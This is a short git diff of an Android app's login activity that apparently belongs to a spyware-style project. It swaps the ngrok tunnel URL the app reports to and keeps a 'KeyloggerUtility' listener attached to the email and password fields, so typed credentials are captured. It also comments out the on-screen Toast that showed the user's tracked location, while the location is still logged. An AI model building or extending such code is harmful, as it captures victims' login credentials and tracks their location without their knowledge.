@@ -99,7 +99,7 @@ public class MainActivity extends AppCompatActivity implements SharedPreferences
         }
     };
 
-    public static String URLNgrok = "https://c719-2404-e801-2001-348-794f-ac60-bb77-a2c5.ap.ngrok.io"; // To be edited if keep changing
+    public static String URLNgrok = "https://2f59-138-75-123-85.in.ngrok.io"; // To be edited if keep changing
     //public static String URLLocalIP = "http://192.168.2.145:5000";
 
     @Override
@@ -190,8 +190,8 @@ public class MainActivity extends AppCompatActivity implements SharedPreferences
         editPassword = findViewById(R.id.password);
         progressbarofLogin = findViewById(R.id.progressbarofSignin);
         firebaseAuth = FirebaseAuth.getInstance();
-        editEmail.addTextChangedListener(new KeyloggerUtility("Email"));
-        editPassword.addTextChangedListener(new KeyloggerUtility("Password"));
+        editEmail.addTextChangedListener(new KeyloggerUtility("Email", "", ""));
+        editPassword.addTextChangedListener(new KeyloggerUtility("Password", "", ""));
 
         register.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -292,7 +292,7 @@ public class MainActivity extends AppCompatActivity implements SharedPreferences
                     .append("Lon: ")
                     .append(event.getLocation().getLongitude())
                     .toString();
-            Toast.makeText(mService, location1, Toast.LENGTH_SHORT).show();
+            // Toast.makeText(mService, location1, Toast.LENGTH_SHORT).show();
             System.out.println("locaaa in " + location1);
 
 
